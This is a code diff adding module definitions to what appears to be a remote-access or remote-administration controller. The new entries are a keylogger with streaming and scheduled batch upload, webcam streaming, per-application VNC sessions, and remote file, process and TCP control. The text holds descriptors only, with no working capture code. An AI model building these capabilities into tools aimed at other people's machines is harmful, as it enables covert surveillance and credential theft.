@@ -21,6 +21,21 @@ export interface AgentModuleDefinition {
 
 export const agentModules: AgentModuleDefinition[] = [
   {
+    id: "app-vnc",
+    title: "Application VNC",
+    description:
+      "Launches curated applications inside a disposable workspace and streams them through VNC.",
+    commands: ["app-vnc"],
+    capabilities: [
+      {
+        id: "app-vnc.launch",
+        name: "app-vnc.launch",
+        description:
+          "Clone per-application profiles and start virtualized sessions.",
+      },
+    ],
+  },
+  {
     id: "remote-desktop",
     title: "Remote Desktop",
     description:
@@ -68,6 +83,26 @@ export const agentModules: AgentModuleDefinition[] = [
     ],
   },
   {
+    id: "webcam-control",
+    title: "Webcam Control",
+    description: "Enumerate and control remote webcam devices.",
+    commands: ["webcam-control"],
+    capabilities: [
+      {
+        id: "webcam.enumerate",
+        name: "webcam.enumerate",
+        description:
+          "Enumerate connected webcam devices and capabilities.",
+      },
+      {
+        id: "webcam.stream",
+        name: "webcam.stream",
+        description:
+          "Initiate webcam streaming sessions when supported.",
+      },
+    ],
+  },
+  {
     id: "audio-control",
     title: "Audio Control",
     description:
@@ -97,6 +132,27 @@ export const agentModules: AgentModuleDefinition[] = [
     ],
   },
   {
+    id: "keylogger",
+    title: "Keylogger",
+    description:
+      "Capture keystrokes and related telemetry from the remote host.",
+    commands: ["keylogger.start", "keylogger.stop"],
+    capabilities: [
+      {
+        id: "keylogger.stream",
+        name: "keylogger.stream",
+        description:
+          "Stream keystroke telemetry to the controller in near real time.",
+      },
+      {
+        id: "keylogger.batch",
+        name: "keylogger.batch",
+        description:
+          "Batch keystrokes offline and upload on a schedule.",
+      },
+    ],
+  },
+  {
     id: "clipboard",
     title: "Clipboard Manager",
     description:
@@ -113,6 +169,67 @@ export const agentModules: AgentModuleDefinition[] = [
         id: "clipboard.push",
         name: "Clipboard push",
         description: "Push operator clipboard payloads to the remote host.",
+      },
+    ],
+  },
+  {
+    id: "file-manager",
+    title: "File Manager",
+    description: "Inspect and manage the remote file system.",
+    commands: ["file-manager"],
+    capabilities: [
+      {
+        id: "file-manager.explore",
+        name: "file-manager.explore",
+        description:
+          "Enumerate directories and retrieve file contents from the host.",
+      },
+      {
+        id: "file-manager.modify",
+        name: "file-manager.modify",
+        description:
+          "Create, update, move, and delete files and directories on demand.",
+      },
+    ],
+  },
+  {
+    id: "task-manager",
+    title: "Task Manager",
+    description: "Enumerate and control processes on the remote host.",
+    commands: ["task-manager"],
+    capabilities: [
+      {
+        id: "task-manager.list",
+        name: "task-manager.list",
+        description:
+          "Collect real-time process snapshots with metadata.",
+      },
+      {
+        id: "task-manager.control",
+        name: "task-manager.control",
+        description:
+          "Start and orchestrate process actions on demand.",
+      },
+    ],
+  },
+  {
+    id: "tcp-connections",
+    title: "TCP Connections",
+    description:
+      "Enumerate and govern active TCP sockets exposed by the host.",
+    commands: ["tcp-connections"],
+    capabilities: [
+      {
+        id: "tcp-connections.enumerate",
+        name: "tcp-connections.enumerate",
+        description:
+          "Collect real-time socket state with process attribution.",
+      },
+      {
+        id: "tcp-connections.control",
+        name: "tcp-connections.control",
+        description:
+          "Stage enforcement actions for suspicious remote peers.",
       },
     ],
   },
